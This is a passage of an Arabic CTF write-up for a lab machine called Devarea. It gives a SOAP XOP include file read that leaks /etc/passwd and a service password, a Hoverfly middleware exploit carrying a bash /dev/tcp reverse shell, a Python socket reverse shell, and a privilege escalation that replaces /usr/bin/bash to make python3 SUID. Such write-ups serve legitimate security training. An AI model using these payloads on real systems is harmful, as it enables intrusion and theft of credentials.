+&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;ns2:submitReportResponse xmlns:ns2=&quot;http://devarea.htb/&quot;&gt;&lt;return&gt;Report received from null. Department: null. Content: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDo5OTg6OTk4OnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50Oi86L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4Ojk5Nzo5OTc6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbjovOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDE6MTAyOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1yZXNvbHZlOng6OTkyOjk5MjpzeXN0ZW1kIFJlc29sdmVyOi86L3Vzci9zYmluL25vbG9naW4KcG9sbGluYXRlOng6MTAyOjE6Oi92YXIvY2FjaGUvcG9sbGluYXRlOi9iaW4vZmFsc2UKcG9sa2l0ZDp4Ojk5MTo5OTE6VXNlciBmb3IgcG9sa2l0ZDovOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c2xvZzp4OjEwMzoxMDQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp1dWlkZDp4OjEwNDoxMDU6Oi9ydW4vdXVpZGQ6L3Vzci9zYmluL25vbG9naW4KdGNwZHVtcDp4OjEwNToxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp0c3M6eDoxMDY6MTA4OlRQTSBzb2Z0d2FyZSBzdGFjaywsLDovdmFyL2xpYi90cG06L2Jpbi9mYWxzZQpsYW5kc2NhcGU6eDoxMDc6MTA5OjovdmFyL2xpYi9sYW5kc2NhcGU6L3Vzci9zYmluL25vbG9naW4KZnd1cGQtcmVmcmVzaDp4Ojk4OTo5ODk6RmlybXdhcmUgdXBkYXRlIGRhZW1vbjovdmFyL2xpYi9md3VwZDovdXNyL3NiaW4vbm9sb2dpbgp1c2JtdXg6eDoxMDg6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4OjEwOTo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCmRldl9yeWFuOng6MTAwMToxMDAxOjovaG9tZS9kZXZfcnlhbjovYmluL2Jhc2gKZnRwOng6MTEwOjExMTpmdHAgZGFlbW9uLCwsOi9zcnYvZnRwOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3dhdGNoOng6OTg0Ojk4NDo6L29wdC9zeXN3YXRjaDovdXNyL3NiaW4vbm9sb2dpbgpwb3N0Zml4Ong6MTExOjExMjo6L3Zhci9zcG9vbC9wb3N0Zml4Oi91c3Ivc2Jpbi9ub2xvZ2luCl9sYXVyZWw6eDo5OTk6OTg3OjovdmFyL2xvZy9sYXVyZWw6L2Jpbi9mYWxzZQpkaGNwY2Q6eDoxMDA6NjU1MzQ6REhDUCBDbGllbnQgRGFlbW9uLCwsOi91c3IvbGliL2RoY3BjZDovYmluL2ZhbHNlCg==&lt;/return&gt;&lt;/ns2:submitReportResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</code></pre></section><p>هذا ملف   etc/hosts  مشفر بصيعغة    base64   وقمت بفك تشفيره</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>echo &quot;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDo5OTg6OTk4OnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50Oi86L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4Ojk5Nzo5OTc6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbjovOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDE6MTAyOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1yZXNvbHZlOng6OTkyOjk5MjpzeXN0ZW1kIFJlc29sdmVyOi86L3Vzci9zYmluL25vbG9naW4KcG9sbGluYXRlOng6MTAyOjE6Oi92YXIvY2FjaGUvcG9sbGluYXRlOi9iaW4vZmFsc2UKcG9sa2l0ZDp4Ojk5MTo5OTE6VXNlciBmb3IgcG9sa2l0ZDovOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c2xvZzp4OjEwMzoxMDQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp1dWlkZDp4OjEwNDoxMDU6Oi9ydW4vdXVpZGQ6L3Vzci9zYmluL25vbG9naW4KdGNwZHVtcDp4OjEwNToxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp0c3M6eDoxMDY6MTA4OlRQTSBzb2Z0d2FyZSBzdGFjaywsLDovdmFyL2xpYi90cG06L2Jpbi9mYWxzZQpsYW5kc2NhcGU6eDoxMDc6MTA5OjovdmFyL2xpYi9sYW5kc2NhcGU6L3Vzci9zYmluL25vbG9naW4KZnd1cGQtcmVmcmVzaDp4Ojk4OTo5ODk6RmlybXdhcmUgdXBkYXRlIGRhZW1vbjovdmFyL2xpYi9md3VwZDovdXNyL3NiaW4vbm9sb2dpbgp1c2JtdXg6eDoxMDg6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4OjEwOTo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCmRldl9yeWFuOng6MTAwMToxMDAxOjovaG9tZS9kZXZfcnlhbjovYmluL2Jhc2gKZnRwOng6MTEwOjExMTpmdHAgZGFlbW9uLCwsOi9zcnYvZnRwOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3dhdGNoOng6OTg0Ojk4NDo6L29wdC9zeXN3YXRjaDovdXNyL3NiaW4vbm9sb2dpbgpwb3N0Zml4Ong6MTExOjExMjo6L3Zhci9zcG9vbC9wb3N0Zml4Oi91c3Ivc2Jpbi9ub2xvZ2luCl9sYXVyZWw6eDo5OTk6OTg3OjovdmFyL2xvZy9sYXVyZWw6L2Jpbi9mYWxzZQpkaGNwY2Q6eDoxMDA6NjU1MzQ6REhDUCBDbGllbnQgRGFlbW9uLCwsOi91c3IvbGliL2RoY3BjZDovYmluL2ZhbHNlCg==&quot; | base64 -d  
+
+# النتيجة  ⬇️⬇️ result
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
+pollinate:x:102:1::/var/cache/pollinate:/bin/false
+polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
+syslog:x:103:104::/nonexistent:/usr/sbin/nologin
+uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
+tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
+ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
+postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
+_laurel:x:999:987::/var/log/laurel:/bin/false
+dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false</code></pre></section><p>وقمنا باستخدامه مرة اخرى لقراءة ملف hoverfly.service</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>curl -s -X POST http://10.129.244.208:8080/employeeservice \
+-H &quot;Content-Type: multipart/related; type=\&quot;application/xop+xml\&quot;; boundary=----boundary&quot; \
+--data-binary $&#39;------boundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type=&quot;text/xml&quot;\r\nContent-ID: &lt;root&gt;\r\n\r\n&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:dev=&quot;http://devarea.htb/&quot; xmlns:xop=&quot;http://www.w3.org/2004/08/xop/include&quot;&gt;\r\n  &lt;soapenv:Body&gt;\r\n    &lt;dev:submitReport&gt;\r\n      &lt;arg0&gt;\r\n        &lt;content&gt;\r\n          &lt;xop:Include href=&quot;file:///etc/systemd/system/hoverfly.service&quot;/&gt;\r\n        &lt;/content&gt;\r\n      &lt;/arg0&gt;\r\n    &lt;/dev:submitReport&gt;\r\n  &lt;/soapenv:Body&gt;\r\n&lt;/soapenv:Envelope&gt;\r\n------boundary--&#39;
+
+
+
+
+
+&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;ns2:submitReportResponse xmlns:ns2=&quot;http://devarea.htb/&quot;&gt;&lt;return&gt;Report received from null. Department: null. Content: W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==&lt;/return&gt;&lt;/ns2:submitReportResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</code></pre></section><p>بنفس الطريقة قمنا بفك تشفيره  وبالفعل اكتشفنا بداخله اسم مستخدم  admin  وكلمة مرور  O7IJ27MyyXiU</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>echo &quot;W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg&quot; | base64 -d
+[Unit]
+Description=HoverFly service
+After=network.target
+
+[Service]
+User=dev_ryan
+Group=dev_ryan
+WorkingDirectory=/opt/HoverFly
+ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
+
+Restart=on-failure
+RestartSec=5
+StartLimitIntervalSec=60
+StartLimitBurst=5
+LimitNOFILE=65536
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target</code></pre></section><p>قمنا بالرجوع الى صفحة تسجيل دخول  hoverfly وستخدمنا ال user name  وال password الي وجدناهم في hoverfly .service&lt;br&gt;</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-8.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-9.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><p>خد بالك من اصدار ال hoverfly 	v1.11.3  وهو مصاب بثغرة  نجد الاستغلال الخاص بها هنا     CVE-2025-54123-Poc <a href="https://github.com/kasem545/CVE-2025-54123-Poc/tree/main" target="_blank" rel="noopener noreferrer">https://github.com/kasem545/CVE-2025-54123-Poc/tree/main</a>&lt;br&gt;&lt;br&gt;1. شغل Listener :   nc -lvnp 4444</p><p>2.نفذ الامر التالي :</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>curl -X PUT &quot;http://10.129.244.208:8888/api/v2/hoverfly/middleware&quot; \
+-H &quot;Content-Type: application/json&quot; \
+-H &quot;Authorization: Bearer $(curl -s -X POST http://10.129.244.208:8888/api/token-auth -d &#39;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;O7IJ27MyyXiU&quot;}&#39; | jq -r &#39;.token&#39;)&quot; \
+-d &#39;{
+  &quot;binary&quot;: &quot;/bin/bash&quot;,
+  &quot;script&quot;: &quot;bash -i &gt;&amp; /dev/tcp/10.129.244.208/4444 0&gt;&amp;1&quot;
+}&#39;</code></pre></section><p><strong>و نحصل على reverse shell </strong></p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-10.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-11.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><h3><strong>we have  user flag  </strong></h3><h3>Privilege Escalation</h3><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>sudo -l                                                                                                                 
+Matching Defaults entries for dev_ryan on devarea:                                                                      
+    env_reset, mail_badpass,                                                                                            
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,                           
+    use_pty                                                                                                             
+                                                                                                                        
+User dev_ryan may run the following commands on devarea:                                                                
+    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh                                              
+        web-stop, !/opt/syswatch/syswatch.sh web-restart                                                                
+dev_ryan@devarea:~$     </code></pre></section><p>قبل الخطوة التالية يجب اعداد شيل نظيفة تمام سنقوم باعداد شيل جديدة من نوع .sh بدل ال  bash</p><p>افتح مستمع جديد  عن طريق nc -lvnp 5332 فيي نافذة جديدة &lt;br&gt;ومن داخل الجلسة الحالية قم بتنفيذ هذا الامر كالتالي :</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>python3 -c &#39;import socket,os,pty;s=socket.socket();s.connect((&quot;10.10.15.9&quot;,5332));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;
+</code></pre></section><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>$ id
+uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
+</code></pre></section><p>بداخل الجلسة الجديدة قم بتنفيذ سلسة الاوامر التالية :</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code># Backup the real bash binary
+cp /usr/bin/bash /tmp/bash.bak
+
+# Create our payload script
+echo &#39;#!/tmp/bash.bak&#39; &gt; /tmp/bash_payload
+echo &#39;chmod u+s /usr/bin/python3&#39; &gt;&gt; /tmp/bash_payload
+
+# Make it executable
+chmod +x /tmp/bash_payload
+
+# Verify contents
+cat /tmp/bash_payload
+
+# Find all bash processes
+ps aux | grep bash | grep -v grep</code></pre></section><p>الناتج output</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>dev_ryan   14383  0.0  0.0   7340  3672 ?        S    01:46   0:00 /bin/bash /tmp/hoverfly/hoverfly_3776765057
+dev_ryan   14384  0.0  0.1   8544  5520 ?        S    01:46   0:00 bash -i</code></pre></section><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code># Kill all bash processes
+kill -9 14383 14384
+
+# Verify no processes are using /usr/bin/bash
+lsof /usr/bin/bash
+# (No output = file is free)</code></pre></section><p>الجلسةالاولى تم قتلها الان واصبح ملف  usr/bin/bash  حرا ويمكننا التعديل فيه او استبداله</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code># Overwrite the system bash binary
+cp /tmp/bash_payload /usr/bin/bash
+
+# Verify the replacement
+ls -la /usr/bin/bash
+cat /usr/bin/bash
+-------------------------------------------------------------
+Output: ⬇️⬇️⬇️⬇️⬇️
+
+-rwxrwxrwx 1 root root 43 Apr  9 07:21 /usr/bin/bash
+#!/tmp/bash.bak
+chmod u+s /usr/bin/python3</code></pre></section><p>الان نقم بتشغيل الملف الخبيث الذي استبدلناه بملف ال bash  الاصلي وسنمتلك جلسة بصلاحيات الروت عندما يقوم البرنامج <a href="http://syswatch.sh" target="_blank" rel="noopener noreferrer">syswatch.sh</a> باستدعاء الملف الخاص بنا</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>sudo /opt/syswatch/syswatch.sh web-status</code></pre></section><p><strong>Spawning Root Shell</strong></p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>python3 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;
+
+ id
+uid=0(root) gid=1001(dev_ryan) groups=1001(dev_ryan)
+
+
+نستطيع قراءة root.txt  الان 
+# cat /root/root.txt
+</code></pre></section><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-12.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure></div>
+      <footer class="ctf-report-end"><a href="index.html" class="btn-primary"><i class="fa-solid fa-arrow-right"></i> كل تقارير CTF</a></footer>
+    </article>
+  </main>
+  <footer class="footer"><div class="footer-content">
+    <div class="footer-logo">Ft7y<span>.Sec</span></div>
+    <div class="footer-links">
+      <a href="../index.html#home">الرئيسية</a><a href="../pentest.html">اختبار الاختراق</a><a href="../appsec.html">أمن التطبيقات</a><a href="../automation.html">البرمجة والأتمتة</a><a href="../systems-labs.html">الأنظمة والمعامل</a><a href="../writeups.html">CTF Write-ups</a>
+    </div>
+    <p>© 2026 Ft7y.Sec. جميع الحقوق محفوظة.</p>
+  </div></footer>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
